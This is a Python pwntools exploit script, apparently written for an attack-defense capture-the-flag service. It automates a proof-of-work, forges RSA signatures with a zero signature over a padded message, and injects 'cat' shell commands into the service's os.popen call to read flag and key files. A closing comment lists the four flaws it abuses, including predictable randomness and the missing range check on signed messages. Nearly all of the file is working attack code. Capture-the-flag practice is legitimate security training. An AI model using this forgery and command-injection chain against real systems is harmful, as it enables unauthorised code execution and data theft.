#!/usr/bin/env python
# -*- coding: UTF-8 -*-

from pwnlib.tubes.remote import remote
from pwnlib import context
import sys
import os
import uuid
import hashlib
import json
import base64
import traceback

context.log_level = 'error'

def n2s(n):
  v = format(n, 'x')
  if len(v) % 2 == 1: v = '0' + v
  return v.decode('hex')

# base64 to number
def b2n(x):
  return int(base64.b64decode(x).encode('hex'), 16)

# number to base64
def n2b(n, size=None):
  if size == None:
    return base64.b64encode(n2s(n))
  else:
    assert n < 256**size
    return base64.b64encode(format(n, '0%dx' % (2*size)).decode('hex'))

# return m', s such that
# 1. pow(s, e, n) == m',
# 2. m' starts with m, and
# 3. m' does not contain a null byte
def forge_signature(m, n, e):
  m = int(m.encode('hex'), 16)

  new_m = 2**3200 * m
  new_m += (-new_m) % n
  while True:
    new_ms = n2s(new_m)
    p = new_ms.find('\x00')
    if p == -1: break
    pos = max(len(new_ms) - p - 256, 0)
    new_m += n * 256**pos
  return new_m, 0

def solve_pow(challenge, prefix):
  resp = 0
  while True:
    if hashlib.sha256(prefix + str(resp)).hexdigest().startswith(challenge):
      return str(resp)
    resp += 1

# 1. arbitrary file read (vulns 1 + 2)
def exploit_001(ip, port, flag_id):
  pass

# 2. remote code execution by forging signatures (vulns 3 + 4)
def exploit_002(ip, port, flag_id):
  r = remote(ip, port)

  # 1. Generates a key
  r.sendlineafter('yellow-submarine$ ', 'keygen')
  r.recvuntil('Please solve the given proof-of-work challenge: ')
  challenge, prefix = r.recvuntil('.')[:-1].split('|')
  if len(challenge) != 4: raise Exception('Proof-of-work too hard')
  response = solve_pow(challenge, prefix)
  r.sendlineafter('> ', response)
  r.recvuntil('n = ')
  n = b2n(r.recvline())
  r.recvuntil('e = ')
  e = b2n(r.recvline())

  # 2. Stores a secret to read the key id
  filename = str(uuid.uuid4())
  secret = base64.b64encode(os.urandom(32))
  r.sendlineafter('yellow-submarine$ ', 'store')
  r.sendlineafter('> ', filename)
  r.sendlineafter('> ', secret)
  r.recvline()
  token = r.recvline().strip()
  
  key_id, _, _, _, _ = token.split('|')

  # 3. Forges the signatures
  cmd_f, sig_f = forge_signature('cat data_%s #' % flag_id, n, e)
  cmd_kf, sig_kf = forge_signature('cat data_%s.key #' % flag_id, n, e)
  
  cmd_f = n2b(cmd_f)
  sig_f = n2b(sig_f, 256)
  cmd_kf = n2b(cmd_kf)
  sig_kf = n2b(sig_kf, 256)

  token = '%s|%s|%s|%s|%s' % (key_id, cmd_f, cmd_kf, sig_f, sig_kf)

  # 4. Reads the secret
  r.sendlineafter('yellow-submarine$ ', 'read')
  r.sendlineafter('> ', token)

  r.recvuntil('Hey. This is your secret:\n')
  flag = base64.b64decode(r.recvline())
  pad_char = ord(flag[-1])
  flag = flag[:-pad_char]

  return {
    'error': 0,
    'error_msg': '',
    'payload': {
      'flag': flag
    }
  }

def exploit(ip, port, flag_id):
  return exploit_002(ip, port, flag_id)

if __name__ == '__main__':
  try:
    print json.dumps(exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3]))
  except Exception as e:
    response = {
      'error': 1,
      'error_msg': str(e) + "\n" + traceback.format_exc(),
      'payload': {}
    }
    print json.dumps(response)


'''
Vulnerabilities:
1. `read` method should not be overwriting `key` and `key_id`, which is used in `store`
2. `random.getrandbits` should not be used as it generates predictable states
3. `read` method should not be containing `os.popen`, which is open to remote code execution
4. `sign` method should be accepting 0 <= m < n only
'''